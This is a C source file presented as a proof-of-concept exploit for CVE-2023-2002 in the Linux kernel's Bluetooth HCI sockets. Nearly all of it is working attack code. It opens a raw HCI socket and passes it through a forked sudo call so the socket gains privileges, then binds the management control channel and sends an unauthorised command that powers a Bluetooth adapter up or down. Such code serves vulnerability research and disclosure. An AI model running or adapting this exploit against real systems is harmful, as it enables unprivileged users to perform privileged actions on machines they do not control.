// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * CVE-2023-2002 PoC exploit.
 * See https://github.com/lrh2000/CVE-2023-2002 for details.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include "bluetooth.h"

static int gain_privileges(void)
{
	int fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

	int pid = fork();
	if (pid == 0) {
		dup2(fd, 2);
		close(fd);

		execlp("sudo", "sudo", NULL);
		exit(EXIT_FAILURE);
	}

	if (waitpid(pid, NULL, 0) < 0) {
		perror("waitpid");
		exit(EXIT_FAILURE);
	}

	return fd;
}

static void bind_control_channel(int fd)
{
	struct sockaddr_hci haddr;

	haddr.hci_family = AF_BLUETOOTH;
	haddr.hci_dev = HCI_DEV_NONE;
	haddr.hci_channel = HCI_CHANNEL_CONTROL;

	if (bind(fd, (struct sockaddr *)&haddr, sizeof(haddr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}
}

static void send_set_power(int fd, int index, int status)
{
	__u8 buffer[sizeof(struct mgmt_hdr) + sizeof(struct mgmt_mode)];
	struct mgmt_hdr *hdr = (struct mgmt_hdr *)buffer;
	struct mgmt_mode *cp = (struct mgmt_mode *)(hdr + 1);

	hdr->opcode = MGMT_OP_SET_POWERED;
	hdr->index = index;
	hdr->len = sizeof(*cp);
	cp->val = status;

	if (send(fd, buffer, sizeof(buffer), 0) < 0) {
		perror("send");
		exit(EXIT_FAILURE);
	}
}

static void check_cmd_result(int fd)
{
	__u8 buffer[sizeof(struct mgmt_hdr) + sizeof(struct mgmt_ev_cmd_status)];
	struct mgmt_hdr *hdr = (struct mgmt_hdr *)buffer;
	struct mgmt_ev_cmd_status *ev = (struct mgmt_ev_cmd_status *)(hdr + 1);
	ssize_t recved;

	recved = recv(fd, buffer, sizeof(buffer), 0);
	if (recved < 0) {
		perror("recv");
		exit(EXIT_FAILURE);
	}
	if (recved == 0) {
		fputs("recv: EOF\n", stderr);
		exit(EXIT_FAILURE);
	}
	if (recved < (ssize_t)sizeof(buffer)) {
		fputs("recv: Incomplete\n", stderr);
		exit(EXIT_FAILURE);
	}

	if (hdr->opcode != MGMT_EV_CMD_COMPLETE &&
	    hdr->opcode != MGMT_EV_CMD_STATUS) {
		fprintf(stderr, "unrecognized opcode: %d\n", (int)hdr->opcode);
		exit(EXIT_FAILURE);
	}
	if (hdr->len < (ssize_t)sizeof(*ev)) {
		fprintf(stderr, "invalid length: %d\n", (int)hdr->len);
		exit(EXIT_FAILURE);
	}

	if (ev->status == MGMT_STATUS_SUCCESS) {
		puts("Success!");
	} else {
		fprintf(stderr, "Failed. Reason: %s\n",
			stringify_mgmt_status(ev->status));
		exit(EXIT_FAILURE);
	}
}

static _Noreturn void usage(char *prog)
{
	fprintf(stderr, "Usage: %s POWER_STATUS DEVICE_INDEX\n", prog);
	fputs("\tPOWER_STATUS := { up | down }\n", stderr);
	fputs("\tDEVICE_INDEX := { 0 | 1 | ... } \n", stderr);

	exit(EXIT_FAILURE);
}

static int parse_int(const char *str, int *res)
{
	char *end;

	*res = strtol(str, &end, 10);
	if (end == str || *end != '\0') {
		return -1;
	}

	return 0;
}

int main(int argc, char **argv)
{
	int power_status;
	int device_index;
	int fd;

	if (argc != 3)
		usage(argv[0]);

	if (strcmp(argv[1], "up") == 0) {
		power_status = 1;
	} else if (strcmp(argv[1], "down") == 0) {
		power_status = 0;
	} else {
		fprintf(stderr, "invalid power status: %s\n\n", argv[1]);
		usage(argv[0]);
	}

	if (parse_int(argv[2], &device_index) != 0) {
		fprintf(stderr, "invalid device index: %s\n\n", argv[2]);
		usage(argv[0]);
	}

	fd = gain_privileges();

	bind_control_channel(fd);

	send_set_power(fd, device_index, power_status);

	check_cmd_result(fd);

	close(fd);

	return 0;
}
